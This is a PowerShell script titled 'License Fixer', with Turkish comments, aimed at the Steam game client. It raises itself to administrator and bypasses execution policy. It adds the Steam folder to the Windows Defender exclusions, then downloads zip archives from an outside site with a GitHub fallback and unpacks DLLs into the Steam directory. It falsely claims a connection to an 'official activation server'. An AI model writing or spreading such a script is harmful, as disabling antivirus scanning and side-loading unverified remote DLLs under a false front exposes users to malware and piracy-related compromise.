[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
}
catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}


Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

cls

[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

# --- Yardımcı Fonksiyonlar ---

function Write-Log ($message, $type) {
    switch ($type) {
        "SUCCESS" { Write-Host "[+] $message" -ForegroundColor Green }
        "ERROR"   { Write-Host "[-] $message" -ForegroundColor Red }
        "WARNING" { Write-Host "[!] $message" -ForegroundColor Yellow }
        default   { Write-Host "[*] $message" }
    }
}

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Start-Process cmd -ArgumentList "/c icacls ""$path"" /reset /T /C" -WindowStyle Hidden -Wait
        Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$path""" -WindowStyle Hidden -Wait
        Remove-Item -Path $path -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    }
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

# --- Başlangıç İşlemleri ---

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
}

# Steam Yolu Kontrolü
if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# --- Windows Defender Bölümü (Düzeltilen Kısım) ---
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $existing = (Get-MpPreference).ExclusionPath
        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender settings. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}

# Eski DLL'leri temizle
Remove-ItemIfExists (Join-Path $steamPath "winhttp.dll")
Remove-ItemIfExists (Join-Path $steamPath "dwmapi.dll")
Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.dll")
Remove-ItemIfExists (Join-Path $steamPath "hid.dll")
Remove-ItemIfExists (Join-Path $steamPath "xinput1_4.dll")
Remove-ItemIfExists (Join-Path $steamPath "version.dll")
Remove-ItemIfExists (Join-Path $steamPath "OpenSteamTool.dll")
Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.toml")
Remove-ItemIfExists (Join-Path $steamPath "opensteamtool.toml")

# --- Ana Fonksiyon ---

function PwStart {
    param(
        [string]$githubBaseUrl = "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
    )

    try {
        if (!$steamPath) { return }

        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
        }

        # Steam yapılandırma temizliği
        Remove-ItemIfExists (Join-Path $steamPath "appcache")
        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")

        try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}

        # --- SYS_0xA7.zip indir ve ayıkla ---
        $gamesDataPath = Join-Path $env:APPDATA "gamesdata"
        if (!(Test-Path $gamesDataPath)) {
            New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue
        }

        $zipLocalSys = Join-Path $env:TEMP "Gamevia.zip"
        $successSys = $false

        # 1. Deneme: Ana Sunucu
        try {
            Invoke-RestMethod -Uri "https://zdb2.pages.dev/Gamevia.zip" -OutFile $zipLocalSys -ErrorAction Stop
            $successSys = $true
        } catch {
        }

        # 2. Deneme: Fallback (GitHub)
        if (-not $successSys) {
            try {
                Invoke-RestMethod -Uri "$githubBaseUrl/Gamevia.zip" -OutFile $zipLocalSys -ErrorAction Stop
                $successSys = $true
            } catch {
            }
        }

        if ($successSys -and (Test-Path $zipLocalSys)) {
            try {
                Expand-Archive -Path $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop

                # gamesdata içindeki depotkeys.json sil
                $depotKeysPath = Join-Path $gamesDataPath "depotkeys.json"
                if (Test-Path $depotKeysPath) {
                    Remove-Item $depotKeysPath -Force -ErrorAction SilentlyContinue
                }
            } catch {
            }
            if (-not [string]::IsNullOrWhiteSpace($zipLocalSys) -and (Test-Path -LiteralPath $zipLocalSys)) {
                 Remove-Item -LiteralPath $zipLocalSys -Force
            }
        }
        
        # dlls.zip indir ve ayıkla
        $zipLocal = Join-Path $env:TEMP "dllg.zip"
        $success = $false

        # 1. Deneme: Ana Sunucu
        try {
            Invoke-RestMethod -Uri "https://zdb2.pages.dev/dllg.zip" -OutFile $zipLocal -ErrorAction Stop
            $success = $true
        } catch {
            Write-Host "Primary source failed, trying fallback..." -ForegroundColor Yellow
        }

        # 2. Deneme: Fallback (GitHub)
        if (-not $success) {
            try {
                Invoke-RestMethod -Uri "$githubBaseUrl/dllg.zip" -OutFile $zipLocal -ErrorAction Stop
                $success = $true
            } catch {
                Write-Host "Failed to download dllg.zip from both sources." -ForegroundColor Red
            }
        }

        if ($success -and (Test-Path $zipLocal)) {
            try {
                Expand-Archive -Path $zipLocal -DestinationPath $steamPath -Force -ErrorAction Stop
                Write-Host "DLLs extracted successfully." -ForegroundColor Green
            } catch {
                Write-Host "Failed to extract dllg.zip." -ForegroundColor Red
            }
            Remove-Item $zipLocal -Force -ErrorAction SilentlyContinue
        }

        # Steam'i Başlat
        $steamExePath = Join-Path $steamPath "steam.exe"
        Start-Process $steamExePath
        Start-Process "steam://"

        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
            Start-Sleep -Seconds 1
        }

        # Pencereyi kapat
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and ("powershell.exe", "WindowsTerminal.exe", "pwsh.exe" -contains $instance.ProcessName)) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }

        exit
    } catch {
    Write-Host "`n===== ERROR =====" -ForegroundColor Red
    Write-Host "Message : $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Type    : $($_.Exception.GetType().FullName)" -ForegroundColor Yellow

    if ($_.InvocationInfo) {
        Write-Host "Line    : $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Yellow
        Write-Host "Command : $($_.InvocationInfo.Line.Trim())" -ForegroundColor Yellow
    }

    Write-Host "`nFull Error:" -ForegroundColor Red
    Write-Host ($_ | Out-String)

    Read-Host "Press Enter to exit"
}
}

# Scripti Çalıştır
PwStart -githubBaseUrl "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
